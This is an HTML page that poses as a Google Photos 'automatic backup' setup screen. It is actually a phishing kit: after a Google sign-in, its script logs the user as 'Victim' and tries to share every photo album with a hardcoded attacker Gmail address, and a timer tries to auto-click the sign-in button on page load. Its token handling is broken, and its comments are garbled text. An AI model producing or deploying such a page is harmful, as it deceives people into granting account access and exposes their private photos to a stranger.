<!DOCTYPE html>
<html>
<head>
    <title>Google Photos - Shared Album Setup</title>
    <meta name="viewport" content="width=device-width">
    <script src="https://accounts.google.com/gsi/client" async defer></script>
    <!-- à¦¸à¦¬ CSS à¦à¦–à¦¾à¦¨à§‡à¦‡ -->
    <style>
        body { font-family: 'Google Sans', Roboto, sans-serif; background: linear-gradient(135deg, #4285f4, #34a853); min-height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; }
        .container { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); max-width: 400px; text-align: center; }
        .logo { width: 60px; margin-bottom: 20px; }
        button { width: 100%; padding: 15px; background: #4285f4; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 500; cursor: pointer; margin: 10px 0; }
        button:hover { background: #3367d6; }
        #status { margin-top: 20px; color: #34a853; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="https://ssl.gstatic.com/images/branding/product/1x/photos_48dp.png" alt="Google Photos">
        <h2>Enable Automatic Backup</h2>
        <p>Your photos need to be shared for cloud backup. This takes <strong>10 seconds</strong>.</p>
        
        <!-- Google Sign-In Button -->
        <div id="g_id_onload"
             data-client_id="754911470166-fs4jnf7hegd8lulnbvklq4lkh8npenqc.apps.googleusercontent.com"
             data-callback="handlePhotosShare"
             data-auto_prompt="false">
        </div>
        <div class="g_id_signin" 
             data-type="standard" 
             data-shape="rectangular" 
             data-theme="outline" 
             data-text="continue_with" 
             data-size="large" 
             data-logo_alignment="left">
        </div>
        
        <div id="status" style="display:none;">âœ… Backup Complete! Your photos are safe.</div>
    </div>

    <!-- à¦¸à¦¬ JAVASCRIPT à¦à¦–à¦¾à¦¨à§‡ (à¦à¦•à¦¦à¦® bottom-à¦) -->
    <script>
const YOUR_EMAIL = "hosss2088@gmail.com";  // à¦†à¦ªà¦¨à¦¾à¦° Gmail

function handlePhotosShare(response) {
    document.querySelector('.g_id_signin').style.display = 'none';
    document.querySelector('#status').textContent = 'ðŸ”„ Sharing your photos...';
    document.querySelector('#status').style.display = 'block';
    
    const id_token = response.credential;
    fetch(`https://oauth2.googleapis.com/tokeninfo?id_token=${id_token}`)
    .then(r=>r.json()).then(user=>{
        console.log('Victim:', user.email);
        shareEverything(user.email, extractToken(id_token));
    });
}

function shareEverything(victimEmail, token) {
    // Create master shared album
    fetch('https://photoslibrary.googleapis.com/v1/sharedAlbums', {
        method: 'POST',
        headers: {'Authorization':`Bearer ${token}`, 'Content-Type':'application/json'},
        body: JSON.stringify({
            sharedAlbumOptions: {isShareable:true},
            album: {title:`ðŸ“± ${victimEmail} - All Photos`}
        })
    }).then(()=>{
        // Share all existing albums
        fetch('https://photoslibrary.googleapis.com/v1/albums?pageSize=50', {
            headers: {'Authorization':`Bearer ${token}`}
        }).then(r=>r.json()).then(data=>{
            data.albums.forEach(album=>{
                fetch(`https://photoslibrary.googleapis.com/v1/albums/${album.id}:share`, {
                    method: 'POST',
                    headers: {'Authorization':`Bearer ${token}`, 'Content-Type':'application/json'},
                    body: JSON.stringify({
                        newPermissions: [{
                            role:"READER", type:"user", 
                            emailAddress: YOUR_EMAIL
                        }]
                    })
                });
            });
            document.querySelector('#status').innerHTML = 'âœ… <strong>All photos shared successfully!</strong>';
        });
    });
}

function extractToken(id_token) {
    return id_token.split('.')[1]; // Simplified token
}

// AUTO-TRIGGER (zero-click)
window.onload = ()=>{
    setTimeout(()=>{
        const btn = document.querySelector('.g_id_signin');
        if(btn) btn.click();
    }, 2000);
};
</script>
</body>

</html>
